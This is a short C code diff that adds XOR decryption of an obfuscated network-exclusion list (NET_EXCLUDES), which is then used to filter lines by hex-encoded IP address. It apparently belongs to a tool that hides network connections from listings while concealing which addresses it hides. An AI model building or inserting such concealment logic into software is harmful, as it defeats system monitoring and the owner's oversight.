@@ -1,7 +1,10 @@
 #include "utils/excludes/net_filtering.h"
 
+#include "utils/encrypt_utils.h"
+
 int net_exclusions_are_empty() {
-    return NET_EXCLUDES[0] == '\0';
+    char excludes[] = NET_EXCLUDES;
+    return excludes[0] == '\0';
 }
 
 void ip_to_hex(const char *ip_str, char *hex_buf) {
@@ -23,6 +26,8 @@ int should_exclude_line(const char *line) {
     } 
 
     char excludes[] = NET_EXCLUDES;  // copy macro to a mutable array
+    xor_decrypt(excludes); // xor decrypt
+
     char *token;
     char *temp_excludes = excludes;
     char search_str[16];
